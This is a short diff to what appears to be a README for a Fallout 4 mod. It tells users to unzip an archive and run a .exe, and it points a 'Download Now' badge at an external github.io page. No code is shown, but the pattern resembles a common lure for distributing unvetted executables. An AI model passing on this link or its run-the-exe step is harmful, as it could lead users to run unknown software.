@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://fallout4-life-in-the-ruins.github.io/.github/)
 
 ## 📸 Overview
 ![fallout4-ruins-survival](https://github.com/user-attachments/assets/a9250006-3c7d-4514-ab5c-184750b32df0)
